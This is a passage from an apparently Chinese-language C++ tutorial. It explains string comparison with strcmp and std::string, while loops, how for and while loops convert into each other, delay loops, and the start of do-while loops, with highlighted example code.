= word1;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误: 比较地址</span></span><br><span class="line">    <span class="keyword">if</span> (word1 == word3) &#123; <span class="comment">// 比较两个不同数组的地址，结果通常是 false</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Mistake: word1 == word3 (comparing addresses)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Mistake: word1 != word3 (comparing addresses)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p1 == p2) &#123; <span class="comment">// 可能 true (如果编译器优化)，也可能 false</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Info: p1 == p2 (compiler might optimize literals)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Info: p1 != p2 (compiler might not optimize literals)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (p3 == word1) &#123; <span class="comment">// true, p3 指向 word1 的起始地址</span></span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Info: p3 == word1 (same address)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 正确: 使用 strcmp() 比较内容</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(word1, word3) == <span class="number">0</span>) &#123; <span class="comment">// 比较内容是否相等</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Correct: strcmp(word1, word3) == 0 (contents are equal)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Correct: strcmp(word1, word3) != 0&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(word1, word2) &lt; <span class="number">0</span>) &#123; <span class="comment">// 比较 word1 是否小于 word2</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Correct: strcmp(word1, word2) &lt; 0 (\&quot;apple\&quot; &lt; \&quot;apply\&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-1-15-比较string类字符串"><a href="#5-1-15-比较string类字符串" class="headerlink" title="5.1.15 比较string类字符串"></a>5.1.15 比较string类字符串</h3><p>与 C 风格字符串不同，C++ 的 <code>std::string</code> 类<strong>重载</strong>了所有的关系运算符（<code>==</code>, <code>!=</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code>）。</p><p>这意味着你可以直接使用这些运算符来比较两个 <code>std::string</code> 对象的<strong>内容</strong>（按字典序进行比较）。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s1 = <span class="string">&quot;apple&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s2 = <span class="string">&quot;apply&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s3 = <span class="string">&quot;apple&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s4 = <span class="string">&quot;Banana&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 直接使用 == 比较内容</span></span><br><span class="line">    <span class="keyword">if</span> (s1 == s3) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 == s3 is true (contents are equal)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 == s3 is false&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 直接使用 !=</span></span><br><span class="line">    <span class="keyword">if</span> (s1 != s2) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 != s2 is true&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 != s2 is false&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 直接使用 &lt;, &gt; 等进行字典序比较</span></span><br><span class="line">    <span class="keyword">if</span> (s1 &lt; s2) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 &lt; s2 is true (\&quot;apple\&quot; &lt; \&quot;apply\&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s1 &lt; s4) &#123; <span class="comment">// 比较 &quot;apple&quot; 和 &quot;Banana&quot;</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 &lt; s4 is true (\&quot;apple\&quot; &gt; \&quot;Banana\&quot; due to case)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">        <span class="comment">// 注意：比较是区分大小写的，&#x27;a&#x27; 的 ASCII 值大于 &#x27;B&#x27;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 &lt; s4 is false (\&quot;apple\&quot; &gt; \&quot;Banana\&quot; due to case)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以和 C 风格字符串字面值比较</span></span><br><span class="line">    <span class="keyword">if</span> (s1 == <span class="string">&quot;apple&quot;</span>) &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 == \&quot;apple\&quot; is true&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>std::string</code> 进行字符串比较比使用 C 风格字符串和 <code>strcmp()</code> 更直观、更安全。</p><h2 id="5-2-while循环"><a href="#5-2-while循环" class="headerlink" title="5.2 while循环"></a>5.2 while循环</h2><p><code>while</code> 循环是 C++ 中另一种重要的循环结构。与 <code>for</code> 循环不同，<code>while</code> 循环在结构上更简单，它只包含一个**测试条件 (Test Condition)**。只要该条件为 <code>true</code>，循环体就会一直执行。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (test_condition) &#123;</span><br><span class="line">    <span class="comment">// 循环体 (statement(s) to be executed repeatedly)</span></span><br><span class="line">    statement1;</span><br><span class="line">    statement2;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 或者如果循环体只有一条语句</span></span><br><span class="line"><span class="keyword">while</span> (test_condition)</span><br><span class="line">    single_statement;</span><br></pre></td></tr></table></figure><p><strong>执行流程:</strong></p><ol><li> 计算 <code>test_condition</code>。</li><li> 如果 <code>test_condition</code> 为 <code>false</code>，跳出循环，执行循环后面的代码。</li><li> 如果 <code>test_condition</code> 为 <code>true</code>，执行循环体中的语句。</li><li> 回到步骤 1。</li></ol><p><strong>关键点:</strong></p><ul><li>  <code>while</code> 循环是一种**入口条件循环 (Entry-Condition Loop)**，即在每次执行循环体之前检查条件。如果第一次检查条件就为 <code>false</code>，则循环体一次也不会执行。</li><li>  循环体内部<strong>必须</strong>有能够影响 <code>test_condition</code> 的语句（例如修改用于判断的变量），否则如果条件初始为 <code>true</code>，循环将永远不会停止，形成**无限循环 (Infinite Loop)**。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 while 循环打印数字 0 到 4</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Counting with while (0-4):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">while</span> (count &lt; <span class="number">5</span>) &#123; <span class="comment">// 1. 测试条件</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;count = &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 2. 循环体</span></span><br><span class="line">        count++; <span class="comment">// 3. 更新条件变量 (非常重要!)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Loop finished.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 示例：等待用户输入特定字符</span></span><br><span class="line">    <span class="keyword">char</span> response;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nEnter &#x27;y&#x27; to continue: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; response;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (response != <span class="string">&#x27;y&#x27;</span> &amp;&amp; response != <span class="string">&#x27;Y&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid input. Please enter &#x27;y&#x27; to continue: &quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; response;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Continuing...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-2-1-for与while"><a href="#5-2-1-for与while" class="headerlink" title="5.2.1 for与while"></a>5.2.1 for与while</h3><p><code>for</code> 循环和 <code>while</code> 循环在很多情况下是可以互换的，因为它们都可以用来实现基于条件的重复执行。</p><p><strong>转换关系:</strong></p><p>一个典型的 <code>for</code> 循环：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (initialization; test_condition; update) &#123;</span><br><span class="line">    body;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以等价地转换为 <code>while</code> 循环：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">initialization; <span class="comment">// 初始化移到循环之前</span></span><br><span class="line"><span class="keyword">while</span> (test_condition) &#123; <span class="comment">// 测试条件保持不变</span></span><br><span class="line">    body;</span><br><span class="line">    update; <span class="comment">// 更新移到循环体的末尾</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>选择依据:</strong></p><ul><li><strong><code>for</code> 循环:</strong><ul><li>  <strong>优点:</strong> 将初始化、测试和更新逻辑集中在循环头部，结构清晰，特别适用于<strong>计数循环</strong>（循环次数已知或易于计算）或需要按固定步长迭代的情况。</li><li>  <strong>适用场景:</strong> 遍历数组、按索引处理字符串、执行固定次数的操作。</li></ul></li><li><strong><code>while</code> 循环:</strong><ul><li>  <strong>优点:</strong> 结构更简单，只关注循环条件，适用于循环次数<strong>不确定</strong>，依赖于某个事件或状态改变的情况。</li><li>  <strong>适用场景:</strong> 等待用户输入、读取文件直到结束、处理链表、当循环条件比计数器更新更重要时。</li></ul></li></ul><p><strong>示例 (两种循环实现相同功能):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用 for 循环计算 1 到 5 的和</span></span><br><span class="line">    <span class="keyword">int</span> sum_for = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; ++i) &#123;</span><br><span class="line">        sum_for += i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum using for: &quot;</span> &lt;&lt; sum_for &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 while 循环计算 1 到 5 的和</span></span><br><span class="line">    <span class="keyword">int</span> sum_while = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i_while = <span class="number">1</span>; <span class="comment">// 初始化</span></span><br><span class="line">    <span class="keyword">while</span> (i_while &lt;= <span class="number">5</span>) &#123; <span class="comment">// 测试条件</span></span><br><span class="line">        sum_while += i_while;</span><br><span class="line">        i_while++; <span class="comment">// 更新</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum using while: &quot;</span> &lt;&lt; sum_while &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然两者可以转换，但选择更自然地表达循环意图的结构可以提高代码的可读性。</p><h3 id="5-2-2-等待一段时间：编写延时循环"><a href="#5-2-2-等待一段时间：编写延时循环" class="headerlink" title="5.2.2 等待一段时间：编写延时循环"></a>5.2.2 等待一段时间：编写延时循环</h3><p>有时我们需要让程序暂停执行一段时间。虽然有更精确、更现代的方法（如 C++11 <code>&lt;chrono&gt;</code> 和 <code>&lt;thread&gt;</code> 库），但可以使用循环来实现简单的、基于处理器时间的**延时循环 (Delay Loop)**。</p><p>这种方法<strong>不精确且不推荐</strong>用于实际的精确延时，因为它：</p><ul><li>  <strong>依赖于处理器速度:</strong> 在快的 CPU 上执行时间短，在慢的 CPU 上执行时间长。</li><li>  <strong>受编译器优化影响:</strong> 编译器可能会识别出循环体为空或无副作用，并将其完全优化掉。</li><li>  <strong>浪费 CPU 资源:</strong> 循环在空转，消耗 CPU 时间，无法执行其他有用任务。</li></ul><p><strong>基本思路:</strong> 执行一个已知需要一定时间的空循环或简单操作的循环。</p><p><strong>示例 (使用 <code>&lt;ctime&gt;</code> 库):</strong></p><p><code>&lt;ctime&gt;</code> (或 C 的 <code>&lt;time.h&gt;</code>) 库提供了一些与时间相关的函数，可以用来实现稍微好一点（但仍不理想）的延时。</p><ul><li>  <code>clock()</code>: 返回程序启动以来所用的<strong>时钟计时单元 (clock ticks)</strong> 数。</li><li>  <code>CLOCKS_PER_SEC</code>: 一个常量，表示每秒包含的时钟计时单元数。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctime&gt; // 为了 clock() 和 CLOCKS_PER_SEC</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Starting delay...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">float</span> delay_seconds = <span class="number">2.5f</span>; <span class="comment">// 期望延时 2.5 秒</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取开始时间</span></span><br><span class="line">    <span class="keyword">clock_t</span> start_time = clock(); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算目标结束时间 (以 clock ticks 为单位)</span></span><br><span class="line">    <span class="keyword">clock_t</span> target_ticks = delay_seconds * CLOCKS_PER_SEC; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环直到经过了足够多的 clock ticks</span></span><br><span class="line">    <span class="keyword">while</span> (clock() &lt; start_time + target_ticks) &#123;</span><br><span class="line">        <span class="comment">// 循环体可以为空，或者执行一些轻量操作</span></span><br><span class="line">        <span class="comment">// ; // 空语句</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Delay finished after approximately &quot;</span> &lt;&lt; delay_seconds &lt;&lt; <span class="string">&quot; seconds.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 另一个简单的空循环延时 (非常不精确)</span></span><br><span class="line">    <span class="comment">// long wait = 0;</span></span><br><span class="line">    <span class="comment">// while (wait &lt; 100000000) &#123; // 循环次数需要根据机器调整</span></span><br><span class="line">    <span class="comment">//     wait++;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Simple loop delay finished.&quot; &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>再次强调:</strong> 对于需要精确延时或暂停执行而不浪费 CPU 的场景，应使用 C++11 及更高版本提供的 <code>&lt;chrono&gt;</code> 和 <code>&lt;thread&gt;</code> 中的 <code>std::this_thread::sleep_for()</code> 或 <code>std::this_thread::sleep_until()</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;chrono&gt; // 为了时间单位 (e.g., seconds, milliseconds)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt; // 为了 std::this_thread::sleep_for</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Starting modern delay...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 延时 2 秒 500 毫秒</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="function">chrono::seconds <span class="title">sec</span><span class="params">(<span class="number">2</span>)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="function">chrono::milliseconds <span class="title">ms</span><span class="params">(<span class="number">500</span>)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">std</span>::this_thread::sleep_for(sec + ms); <span class="comment">// 线程休眠，不消耗 CPU</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Modern delay finished.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个现代方法更精确、可移植性更好，并且不会浪费 CPU 周期。</p><h2 id="5-3-do-while循环"><a href="#5-3-do-while循环" class="headerlink" title="5.3 do while循环"></a>5.3 do while循环</h2><p><code>do while</code> 循环是 C++ 提供的第三种循环结构。它与 <code>while</code> 循环非常相似，但有一个关键区别：<code>do while</code> 循环是**出口条件循环 (Exit-Condition Loop)**，而 <code>while</code> 循环是入口条件循环。</p><p>这意味着 <code>do while</code> 循环会<strong>先执行一次循环体</strong>，<strong>然后再</strong>检查测试条件。只要条件为 <code>true</code>，循环就会继续执行。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment">// 循环体 (statement(s) to be executed repeatedly)</span></span><br><span class="line">    statement1;</span><br><span class="line">    statement2;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125; <span class="keyword">while</span> (test_condition); <span class="comment">// 注意这里的条件后面必须有分号 ;</span></span><br></pre></td></tr></table></figure><p>或者如果循环体只有一条语句（虽然不常见，且为了清晰通常还是用花括号）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">    single_statement;</span><br><span class="line"><span class="keyword">while</span> (test_condition); </span><br></pre></td></tr></table></figure><p><strong>执行流程:</strong></p><ol><li> 执行循环体中的语句。</li><li> 计算 <code>test_condition</code>。</li><li> 如果 <code>test_condition</code> 为 <code>true</code>，回到步骤 1。</li><li> 如果 <code>test_condition</code> 为 <code>false</code>，循环终止，执行循环后面的代码。</li></ol><p><strong>关键点:</strong></p><ul><li>  <strong>至少执行一次:</strong> 由于条件是在循环体执行之后检查的，<code>do while</code> 循环的循环体<strong>至少会执行一次</strong>，即使条件初始就为 <code>false</code>。</li><li>  <strong>分号:</strong> <code>while (test_condition)</code> 后面必须有一个分号 <code>;</code>。</li><li>  <strong>适用场景:</strong> 当你需要确保循环体中的代码至少执行一次时，<code>do while</code> 循环是理想的选择。例如，获取用户输入并验证，至少需要获取一次输入才能进行验证。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 示例：要求用户输入一个正数</span></span><br><span class="line">    <span class="comment">// 循环体至少执行一次以获取输入</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a positive number: &quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span> 